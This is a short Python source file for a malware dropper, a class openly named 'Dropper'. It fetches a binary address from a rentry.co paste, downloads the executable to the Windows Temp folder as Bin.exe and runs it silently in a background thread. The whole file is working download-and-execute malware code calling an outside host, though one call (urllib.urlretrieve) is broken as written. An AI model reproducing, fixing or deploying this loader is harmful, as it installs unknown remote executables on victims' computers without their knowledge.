import os, urllib.request, urllib, threading

__BASE_URL__ = 'https://rentry.co/2sv84/raw'

class Dropper:
	@staticmethod
	def ResolveBinaryAddr() -> str:
		return urllib.request.urlopen(urllib.request.Request(__BASE_URL__)).read().decode('utf-8')
	
	@staticmethod
	def DownloadBinary(url: str) -> str:
		path = f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\Bin.exe"

		urllib.urlretrieve(url, path)
		
		return path

	@staticmethod
	def RunBinary(path: str):
		os.system(f'start {path}')

def __init__():
	Dropper.RunBinary(Dropper.DownloadBinary(Dropper.ResolveBinaryAddr()))

def init():
    threading.Thread(target=__init__).start()